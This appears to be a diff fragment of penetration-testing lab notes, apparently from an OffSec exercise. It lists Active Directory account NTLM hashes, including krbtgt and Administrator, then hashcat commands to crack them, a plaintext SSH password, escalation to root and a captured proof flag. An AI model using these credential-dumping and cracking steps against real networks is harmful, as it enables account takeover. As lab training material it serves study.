+1107    peach   4e340266b912685014b98560d274d260        66050
+1106    joe     08d7a47a6f9f66b97b1bae4178747494        66048
+1110    yoshi   fdf36048c1cf88f5630381c5e38feb8e        66048
+1108    mario   8909f22bda647d382e7b448bea350175        66048
+1105    leon    2e208ad146efda5bc44869025e06544a        66048
+1109    wario   fdf36048c1cf88f5630381c5e38feb8e        66048
+
+502     krbtgt  7e68841e296897d2343488c23265e8b8        514
+1001    DC01$   c95bb9678cbd2d810db302584305be39        532480
+500     Administrator   c33b5cf9fa1b1bb4894d4a6cd7c54034        66048
+1112    CLIENT01$       0bd3b021f57b5ddd3ae862560569c22b        4096
+1104    FILES02$        fb36a7a5c8b2b2a12e52966b8d136848        4096
+1111    DEV04$  3acc0fff9b942acfee4d9a2af2d305d8        4096
+1115    WEB02$  601bd71e7e2aacdc844a02f539fba3b7        4096
+1114    CLIENT02$       64ee53fcc4e23749699f69d34c4bcf20        4096
+1113    PROD01$ 7721ca37617773d5bcdb79dc847a7b27        4096
+
+hashcat -m 1000 mario.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000 peach.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000 wario.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000 leon.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+$HEX[7261626269743a29]
+hashcat -m 1000 yoshi.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+hashcat -m 1000 krbtgt.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000 DC01.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000 CLIENT01.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000 FILES02.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000 DEV04.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000 WEB02.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000 CLIENT02.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat -m 1000 PROD01.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+---------------------------------------------------------------------------------------------
+OFFSEC
+
+ssh offsec@192.168.185.120
+century62hisan51
+history
+offsec@WEB01:~/offsec$ sudo su
+root@WEB01:~# cat proof.txt
+b002748732472f426b5bba7784d9bda5
+
+root@WEB01:~/_site# cat robots.txt
+Sitemap: http://localhost:4000/sitemap.xml
+
+---------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------
